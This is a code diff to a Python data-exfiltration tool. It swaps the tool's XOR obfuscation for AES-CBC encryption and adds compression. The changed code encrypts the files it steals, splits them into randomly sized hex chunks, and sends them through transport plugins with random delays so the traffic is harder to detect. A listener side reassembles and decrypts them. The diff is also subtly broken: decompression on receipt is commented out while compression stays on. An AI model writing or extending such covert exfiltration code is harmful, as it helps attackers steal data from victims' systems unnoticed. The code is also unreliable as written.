@@ -8,16 +8,20 @@ import string
 import time
 import json
 import signal
+import struct
+import tempfile
 from random import randint
 from os import listdir
 from os.path import isfile, join
-
+from Crypto.Cipher import AES
+from zlib import compress, decompress
 
 KEY = ""
 MIN_TIME_SLEEP = 1
 MAX_TIME_SLEEP = 30
 MIN_BYTES_READ = 1
 MAX_BYTES_READ = 500
+COMPRESSION    = True
 files = {}
 threads = []
 config = None
@@ -50,14 +54,39 @@ def info(message):
     display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))
 
 
-# xor utility
-def xor(message, key=KEY):
-    res = ""
-    for i, c in enumerate(message):
-        tmp = ord(c) ^ ord(key[i % len(key)])
-        res += chr(tmp)
-    return res
+# http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
+def aes_encrypt(message, key=KEY):
+    try:
+        # Generate random CBC IV
+        iv = os.urandom(AES.block_size)
 
+        # Derive AES key from passphrase
+        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+
+        # Add PKCS5 padding
+        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+
+        # Return data size, iv and encrypted message
+        return iv + aes.encrypt(pad(message))
+    except:
+        return None
+
+def aes_decrypt(message, key=KEY):
+    try:
+        # Retrieve CBC IV
+        iv = message[:AES.block_size]
+        message = message[AES.block_size:]
+
+        # Derive AES key from passphrase
+        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        message = aes.decrypt(message)
+
+        # Remove PKCS5 padding
+        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+
+        return unpad(message)
+    except:
+        return None
 
 # Do a md5sum of the file
 def md5(fname):
@@ -73,14 +102,15 @@ function_mapping = {
     'warning': warning,
     'ok': ok,
     'info': info,
-    'xor': xor
+    'aes_encrypt' : aes_encrypt,
+    'aes_decrypt': aes_decrypt
 }
 
 
 class Exfiltration(object):
 
-    def __init__(self, results):
-
+    def __init__(self, results, KEY):
+        self.KEY = KEY
         self.plugin_manager = None
         self.plugins = {}
         self.results = results
@@ -113,8 +143,11 @@ class Exfiltration(object):
     def get_plugins(self):
         return self.plugins
 
-    def xor(self, message):
-        return xor(message, KEY)
+    def aes_encrypt(self, message):
+        return aes_encrypt(message, self.KEY)
+
+    def aes_decrypt(self, message):
+        return aes_decrypt(message, self.KEY)
 
     def log_message(self, mode, message):
         if mode in function_mapping:
@@ -154,9 +187,11 @@ class Exfiltration(object):
     def retrieve_file(self, jobid):
         global files
         fname = files[jobid]['filename']
-        filename = "%s.%s" % (fname.replace(
-            os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
+        filename = "%s.%s" % (fname.replace(os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
         content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
+        content = aes_decrypt(content, self.KEY)
+	#if COMPRESSION:
+        #    content = decompress(content)
         f = open(filename, 'w')
         f.write(content)
         f.close()
@@ -169,7 +204,7 @@ class Exfiltration(object):
     def retrieve_data(self, data):
         global files
         try:
-            message = xor(data, KEY)
+            message = data
             if (message.count("|!|") >= 2):
                 info("Received {0} bytes".format(len(message)))
                 message = message.split("|!|")
@@ -188,6 +223,7 @@ class Exfiltration(object):
                         files[jobid]['data'].append(''.join(message[2:]))
                         files[jobid]['packets_number'].append(message[1])
         except:
+            raise
             pass
 
 
@@ -217,7 +253,15 @@ class ExfiltrateFile(threading.Thread):
         time.sleep(time_to_sleep)
 
         # sending the data
-        f = open(self.file_to_send, "rb")
+        f = tempfile.SpooledTemporaryFile()
+        e = open(self.file_to_send, 'rb')
+        data = e.read()
+        if COMPRESSION:
+            data = compress(data)
+        f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        f.seek(0)
+        e.close()
+
         packet_index = 0
         while (True):
             data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
@@ -240,6 +284,7 @@ class ExfiltrateFile(threading.Thread):
         ok("Using {0} as transport method".format(plugin_name))
         data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
         plugin_send_function(data)
+        f.close()
         sys.exit(0)
 
 
@@ -250,7 +295,7 @@ def signal_handler(bla, frame):
 
 
 def main():
-    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ
+    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
     global threads, config
 
     parser = argparse.ArgumentParser(
@@ -285,8 +330,9 @@ def main():
     MAX_TIME_SLEEP = int(config['max_time_sleep'])
     MIN_BYTES_READ = int(config['min_bytes_read'])
     MAX_BYTES_READ = int(config['max_bytes_read'])
-    KEY = config['XOR_KEY']
-    app = Exfiltration(results)
+    COMPRESSION    = bool(config['compression'])
+    KEY = config['AES_KEY']
+    app = Exfiltration(results, KEY)
 
     # LISTEN MODE
     if (results.listen):
